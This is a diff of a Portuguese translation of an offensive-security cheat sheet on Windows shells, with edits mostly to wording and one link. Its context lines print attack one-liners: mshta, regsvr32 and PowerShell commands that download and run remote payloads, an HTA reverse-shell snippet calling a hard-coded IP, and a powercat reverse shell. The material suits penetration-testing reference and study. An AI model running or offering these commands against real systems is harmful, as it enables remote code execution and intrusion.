@@ -87,7 +87,7 @@ Payload escrito no disco: **NÃO** (_pelo menos em nenhum lugar que eu consegui 
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Processo realizando chamada de rede: **svchost.exe**\
-Carga útil escrita no disco: **Cache local do cliente WebDAV**
+Payload escrito no disco: **Cache local do cliente WebDAV**
 
 **Uma linha:**
 ```bash
@@ -109,7 +109,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Exemplo de shell reversa hta-psh (use hta para baixar e executar o backdoor PS)**
+#### **Exemplo de shell reverso hta-psh (use hta para baixar e executar backdoor PS)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -224,7 +224,7 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 #### Regsvr32 -sct
 
 [**Daqui**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -420,7 +420,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Crie um lançador de powershell, salve-o em um arquivo e faça o download e execute-o.
+Crie um lançador do powershell, salve-o em um arquivo e faça o download e execute-o.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -447,7 +447,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ## Mais
 
 [PS>Attack](https://github.com/jaredhaight/PSAttack) console PS com alguns módulos PS ofensivos pré-carregados (cifrado)\
-[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9)[\
+[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) console PS com alguns módulos PS ofensivos e detecção de proxy (IEX)
 
 ## Referências
